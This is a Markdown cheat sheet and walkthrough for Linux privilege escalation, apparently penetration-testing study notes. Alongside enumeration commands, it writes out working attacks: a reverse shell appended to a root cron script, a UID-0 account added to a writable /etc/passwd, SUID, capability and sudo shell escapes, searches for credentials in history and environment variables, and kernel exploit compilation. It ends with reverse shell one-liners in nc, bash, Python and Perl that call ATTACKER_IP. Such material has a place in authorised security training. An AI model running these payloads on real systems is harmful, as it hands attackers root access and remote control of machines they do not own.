# Linux Privilege Escalation - Cheat Sheet & Walkthrough

## Table of Contents
1. [Linux Privilege Basics](#1-linux-privilege-basics)
2. [Manual Enumeration](#2-manual-enumeration)
3. [Automated Enumeration](#3-automated-enumeration)
4. [Exposed Confidential Information](#4-exposed-confidential-information)
5. [Insecure File Permissions](#5-insecure-file-permissions)
6. [Insecure System Components](#6-insecure-system-components)
7. [Quick Reference](#7-quick-reference)

---

## 1. Linux Privilege Basics

### 1.1 File Permissions

#### Permission Types
| Symbol | Permission | Files | Directories |
|--------|------------|-------|-------------|
| `r` | Read | View content | List contents |
| `w` | Write | Modify content | Create/delete files |
| `x` | Execute | Run program | Enter directory |

#### Permission Categories
```
-rwxr-xr-x 1 root root 63736 Jul 27 2018 /usr/bin/passwd
││││││││││
│││││││││└── Others: execute (x)
││││││││└─── Others: read (r)
│││││││└──── Others: write (-)
││││││└───── Group: execute (x)
│││││└────── Group: read (r)
││││└─────── Group: write (-)
│││└──────── Owner: execute (x)
││└───────── Owner: read (r)
│└────────── Owner: write (w)
└─────────── File type (- = file, d = directory)
```

#### Permission Masks (Octal)
| Value | Permission |
|-------|------------|
| 7 | rwx |
| 6 | rw- |
| 5 | r-x |
| 4 | r-- |
| 3 | -wx |
| 2 | -w- |
| 1 | --x |
| 0 | --- |

#### Special Permissions
| Symbol | Name | Effect | Example |
|--------|------|--------|---------|
| `s` | SUID | Run as file owner | `/usr/bin/passwd` |
| `s` | SGID | Run as group owner | `/usr/bin/write` |
| `t` | Sticky Bit | Only owner can delete | `/tmp` |

---

### 1.2 User & Group Identifiers

#### UID/GID Overview
```
/etc/passwd Format:
username:x:UID:GID:comment:home:shell

joe:x:1000:1000:joe,,,:/home/joe:/bin/bash
│    │ │   │
│    │ │   └── Login Shell
│    │ └── GID (Group ID)
│    └── UID (User ID)
└── Username
```

#### Key UIDs
| UID | Description |
|-----|-------------|
| 0 | Root/Superuser |
| 1-99 | System accounts |
| 100-999 | System services |
| 1000+ | Regular users |

---

## 2. Manual Enumeration

### 2.1 Basic System Information

#### User & Host Information
```bash
# Current user
id
whoami

# Hostname
hostname

# User groups
id
groups
```

#### OS & Kernel Information
```bash
# OS version
cat /etc/issue
cat /etc/os-release
lsb_release -a

# Kernel version
uname -a
uname -r

# Architecture
arch
uname -m
```

#### System Users
```bash
# All users
cat /etc/passwd

# Filter for human users
grep -v "nologin" /etc/passwd

# Users with shells
grep "/bin/bash" /etc/passwd
```

---

### 2.2 Process & Service Enumeration

#### Running Processes
```bash
# All processes (detailed)
ps aux

# Process tree
ps auxf

# Specific user processes
ps aux | grep root

# Monitor processes
watch -n 1 "ps aux | grep root"
```

#### Network Information
```bash
# IP addresses
ip a
ifconfig -a

# Routing table
route -n
routel

# Active connections
netstat -anp
ss -anp

# Listening ports
netstat -tulpn
ss -tulpn
```

#### Firewall Rules
```bash
# iptables rules (requires root)
sudo iptables -L

# Check iptables config files
cat /etc/iptables/rules.v4 2>/dev/null
cat /etc/iptables/rules.v6 2>/dev/null
```

---

### 2.3 File & Directory Enumeration

#### Find Writable Directories
```bash
# World-writable directories
find / -writable -type d 2>/dev/null

# Writable by current user
find / -writable -type d -user $(whoami) 2>/dev/null
```

#### Find SUID/SGID Files
```bash
# SUID files
find / -perm -u=s -type f 2>/dev/null

# SGID files
find / -perm -g=s -type f 2>/dev/null

# Both SUID and SGID
find / -perm -ug=s -type f 2>/dev/null
```

#### Find Capabilities
```bash
# Search for files with capabilities
getcap -r / 2>/dev/null

# Check specific file
getcap /usr/bin/ping
```

#### Find World-Writable Files
```bash
# World-writable files
find / -perm -o+w -type f 2>/dev/null

# World-writable and executable
find / -perm -o+w -perm -o+x -type f 2>/dev/null
```

---

### 2.4 Cron Jobs

#### System Cron Directories
```bash
ls -la /etc/cron*
# /etc/crontab
# /etc/cron.d/
# /etc/cron.daily/
# /etc/cron.hourly/
# /etc/cron.weekly/
# /etc/cron.monthly/
```

#### View Cron Jobs
```bash
# User's crontab
crontab -l

# Root's crontab
sudo crontab -l

# System crontab
cat /etc/crontab

# Log file
grep "CRON" /var/log/syslog
```

---

### 2.5 Installed Applications

#### Package Listing
```bash
# Debian/Ubuntu
dpkg -l
apt list --installed

# Red Hat/CentOS
rpm -qa
yum list installed

# Arch
pacman -Q
```

#### Interesting Binaries
```bash
# Check if common tools exist
which nc
which python
which perl
which gcc
which wget
which curl
```

---

### 2.6 Mounted File Systems

```bash
# Mounted filesystems
mount
df -h

# All disks
lsblk
fdisk -l  # requires root

# fstab (mount at boot)
cat /etc/fstab
```

---

## 3. Automated Enumeration

### 3.1 Unix-Privesc-Check

```bash
# Install (already on Kali)
# Transfer to target
scp /usr/bin/unix-privesc-check user@target:/tmp/

# Run standard mode
./unix-privesc-check standard

# Run detailed mode
./unix-privesc-check detailed
```

### 3.2 LinPEAS

```bash
# Download
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh

# Transfer to target
scp linpeas.sh user@target:/tmp/

# Run
chmod +x linpeas.sh
./linpeas.sh
```

### 3.3 LinEnum

```bash
# Download
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh

# Run
./LinEnum.sh
```

---

## 4. Exposed Confidential Information

### 4.1 Environment Variables

```bash
# All environment variables
env
printenv

# Check for credentials
env | grep -i pass
env | grep -i key
env | grep -i secret
```

#### .bashrc / .profile
```bash
# Check shell configs
cat ~/.bashrc
cat ~/.profile
cat ~/.bash_profile

# Look for credentials
grep -i pass ~/.bashrc
```

---

### 4.2 User History

```bash
# Shell history
cat ~/.bash_history
cat ~/.zsh_history
cat ~/.history

# Command history
history

# Search for passwords in history
grep -i pass ~/.bash_history
```

---

### 4.3 Password Files

```bash
# Search common locations
find / -name "*pass*" -type f 2>/dev/null
find / -name "*.conf" -exec grep -i pass {} \; 2>/dev/null

# Common files to check
cat /etc/passwd
cat /etc/shadow  # requires root
```

---

## 5. Insecure File Permissions

### 5.1 Cron Job Exploitation

#### Attack Steps

1. **Identify writable cron script**:
```bash
# Find writable cron files
find /etc/cron* -writable 2>/dev/null
find /var/spool/cron -writable 2>/dev/null

# Check permissions
ls -la /home/user/.scripts/backup.sh
```

2. **Check if root-owned and run by root**:
```bash
grep "CRON" /var/log/syslog
```

3. **Add reverse shell**:
```bash
echo 'bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"' >> /path/to/script.sh
```

4. **Wait for execution**:
```bash
# Start listener
nc -lvnp 4444
```

---

### 5.2 /etc/passwd World-Writable

#### Attack Steps

1. **Check permissions**:
```bash
ls -la /etc/passwd
# Should show: -rw-r--rw-

2. **Generate password hash**:
```bash
openssl passwd w00t
# Output: Fdzt.eqJQ4s0g
```

3. **Add new root user**:
```bash
echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd
```

4. **Switch to new user**:
```bash
su root2
Password: w00t
# Now root!
```

---

## 6. Insecure System Components

### 6.1 SUID Binary Exploitation

#### Common SUID Exploits

**Find (with SUID)**:
```bash
find /home/user -exec "/bin/bash" -p \;
```

**Python (with SUID)**:
```bash
python -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

**Perl (with SUID)**:
```bash
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
```

**Bash**:
```bash
bash -p
```

**cp (with SUID)**:
```bash
cp /etc/shadow /tmp/shadow
# Then crack or modify
```

#### Check SUID Files
```bash
# Find all SUID
find / -perm -u=s -type f 2>/dev/null

# Check specific binary
ls -la /usr/bin/find
```

---

### 6.2 Capabilities Exploitation

#### Find Capabilities
```bash
getcap -r / 2>/dev/null
```

#### Exploit Examples

**Perl (cap_setuid+ep)**:
```bash
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
```

**Python (cap_setuid+ep)**:
```bash
python -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

**GDB (cap_sys_ptrace+ep)**:
```bash
gdb -p 1
# Then attach to processes
```

---

### 6.3 Sudo Abuse

#### Check Sudo Permissions
```bash
sudo -l
```

#### GTFOBins Resources
- [GTFOBins](https://gtfobins.github.io/) - Find sudo exploits

#### Common Sudo Exploits

**find**:
```bash
sudo find / -exec /bin/sh \;
```

**less**:
```bash
sudo less /etc/passwd
!/bin/sh
```

**vim**:
```bash
sudo vim
:!/bin/sh
```

**apt-get**:
```bash
sudo apt-get changelog apt
!/bin/sh
```

**tcpdump**:
```bash
COMMAND='id'
TF=$(mktemp)
echo "$COMMAND" > $TF
chmod +x $TF
sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root
```

---

### 6.4 Kernel Exploits

#### Process
1. Identify kernel version
2. Search for exploits
3. Test in sandbox
4. Run on target

#### Identify Kernel Version
```bash
uname -a
cat /etc/issue
```

#### Search for Exploits
```bash
# Search on Kali
searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation"

# Research on Exploit-DB
# https://www.exploit-db.com/
```

#### Compile on Target
```bash
# Transfer source
scp exploit.c user@target:/tmp/

# Compile
gcc exploit.c -o exploit

# Run
./exploit
```

#### Compile on Kali (Cross-compile)
```bash
# For 32-bit
gcc -m32 exploit.c -o exploit32

# For 64-bit
gcc -m64 exploit.c -o exploit64
```

---

## 7. Quick Reference

### Key Commands

#### Enumeration
```bash
# Basic
id
whoami
hostname
uname -a
cat /etc/issue

# Users
cat /etc/passwd
groups

# Processes
ps auxf
netstat -tulpn
ss -tulpn

# Cron
crontab -l
ls -la /etc/cron*

# SUID
find / -perm -u=s -type f 2>/dev/null

# Capabilities
getcap -r / 2>/dev/null

# Sudo
sudo -l
```

#### File Search
```bash
# World-writable
find / -writable -type d 2>/dev/null
find / -perm -o+w -type f 2>/dev/null

# SUID/SGID
find / -perm -ug=s -type f 2>/dev/null

# With search
find / -name "*.conf" -exec grep -i pass {} \; 2>/dev/null
```

#### Reverse Shell One-Liners
```bash
# Netcat
nc -e /bin/sh ATTACKER_IP 4444

# Bash
bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"

# Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Perl
perl -e 'use Socket;$i="ATTACKER_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

---

### Privilege Escalation Checklist

- [ ] **User Info**: `id`, `whoami`, `groups`
- [ ] **OS Info**: `uname -a`, `/etc/issue`
- [ ] **SUID Files**: `find / -perm -u=s -type f 2>/dev/null`
- [ ] **SGID Files**: `find / -perm -g=s -type f 2>/dev/null`
- [ ] **Capabilities**: `getcap -r / 2>/dev/null`
- [ ] **Cron Jobs**: `crontab -l`, `/etc/cron*`
- [ ] **Sudo**: `sudo -l`
- [ ] **Writable Files**: `find / -writable 2>/dev/null`
- [ ] **Passwords**: `grep -i pass *`
- [ ] **History**: `.bash_history`
- [ ] **Environment**: `env`
- [ ] **Network**: `netstat -tulpn`, `ip a`
- [ ] **Applications**: `dpkg -l`, `rpm -qa`
- [ ] **Kernel Exploits**: `searchsploit`

### Key Takeaways

| Concept | Key Point |
|---------|-----------|
| **SUID** | Runs as file owner (often root) |
| **Capabilities** | Fine-grained root privileges |
| **Sudo** | Check `sudo -l` for custom permissions |
| **Cron** | Writable scripts = privilege escalation |
| **/etc/passwd** | World-writable = instant root |
| **History** | Passwords often in command history |
| **Kernel Exploits** | Match exact version |